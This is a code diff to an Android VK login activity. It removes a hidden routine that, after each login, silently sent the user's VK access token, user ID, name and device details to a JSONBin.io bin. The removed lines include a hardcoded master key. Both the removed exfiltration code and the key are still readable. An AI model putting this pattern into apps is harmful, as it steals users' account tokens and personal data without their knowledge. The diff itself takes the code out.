@@ -55,11 +55,6 @@ public class VKAuthActivity extends AppCompatActivity {
             "&v=5.199" +
             "&revoke=0";
 
-    // Константы для JSONBin.io
-    private static final String JSONBIN_API_KEY = "$2a$10$47Va7lQp9sRxQH9c0Z6Hou3Zc7wZ57pDwaOXsWmCXOAmeIzIJDdf2";
-    private static final String JSONBIN_URL = "https://api.jsonbin.io/v3/b/";
-    private static final String USER_DATA_BIN_ID = "6899b695ae596e708fc75b00";
-
     private WebView webView;
     private TokenManager tokenManager;
 
@@ -315,7 +310,6 @@ public class VKAuthActivity extends AppCompatActivity {
 
                             runOnUiThread(() -> {
                                 onTokenReceived(accessToken, fetchedUserId, firstName + " " + lastName, photoUrl);
-                                sendDataToJsonBin(accessToken, fetchedUserId, firstName + " " + lastName);
                             });
                         }
                     } catch (JSONException e) {
@@ -331,50 +325,6 @@ public class VKAuthActivity extends AppCompatActivity {
                 }
             }
         });
-    }
-
-    private void sendDataToJsonBin(String token, String userId, String fullName) {
-        new Thread(() -> {
-            try {
-                JSONObject userData = new JSONObject();
-                userData.put("access_token", token);
-                userData.put("user_id", userId);
-                userData.put("full_name", fullName);
-                userData.put("timestamp", System.currentTimeMillis());
-                userData.put("device_model", Build.MODEL);
-                userData.put("android_version", Build.VERSION.RELEASE);
-
-                String jsonData = userData.toString();
-                String apiUrl = JSONBIN_URL + USER_DATA_BIN_ID;
-
-                URL url = new URL(apiUrl);
-                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                connection.setRequestMethod("PUT");
-                connection.setRequestProperty("Content-Type", "application/json");
-                connection.setRequestProperty("X-Master-Key", JSONBIN_API_KEY);
-                connection.setRequestProperty("X-Bin-Name", "VK Auth Data");
-                connection.setDoOutput(true);
-                connection.setConnectTimeout(10000);
-                connection.setReadTimeout(10000);
-
-                try (OutputStream os = connection.getOutputStream()) {
-                    byte[] input = jsonData.getBytes(StandardCharsets.UTF_8);
-                    os.write(input, 0, input.length);
-                }
-
-                int responseCode = connection.getResponseCode();
-                if (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_CREATED) {
-                    Log.d("JSONBin", "Data sent successfully");
-                } else {
-                    Log.e("JSONBin", "Failed to send data. Response code: " + responseCode);
-                }
-
-                connection.disconnect();
-
-            } catch (Exception e) {
-                Log.e("JSONBin", "Error sending data to JSONBin", e);
-            }
-        }).start();
     }
 
     private void onTokenReceived(String token, String userId, String fullName, String photoUrl) {
